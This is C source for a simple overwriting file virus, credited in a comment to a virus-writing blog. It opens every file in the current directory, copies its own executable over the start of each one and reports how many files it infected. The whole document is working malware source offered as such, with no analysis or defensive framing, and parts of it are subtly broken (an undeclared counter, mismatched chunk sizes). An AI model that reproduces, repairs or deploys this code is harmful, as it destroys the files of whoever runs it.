FILE *virus, *vhost;
int done=0;
unsigned long x;
char buff[256];
struct ffblk ffblk;
clock_t st,end;

main() // by Viruswriting.blogspot.com
{
	st=clock();
	clrscr();
	done=findfirst("*.*",&ffblk,0);
	while(!done)
	{
		virus=fopen(_arg[0],"rb");
		vhost=fopen(ffblk.ff_name,"rb+");
		if(vhost==NULL)
			goto next;
		x=89088;
		printf("infecting %s\n",ffblk.ff_name);
		while(x>2048)
		{
			fread(buff,256,1,virus);
			fwrite(buff,256,1,vhost);
			x-=2048;
		}
		fread(buff,x,1,virus);
		fwrite(buff,x,1,vhost);
		a++;
		next:	fcloseall();
			done=findnext(&ffblk);
	}
	end=clock();
	printf("infected %d files in %f sec",a,(end-st)/CLK_TCK);
	return(0);
}
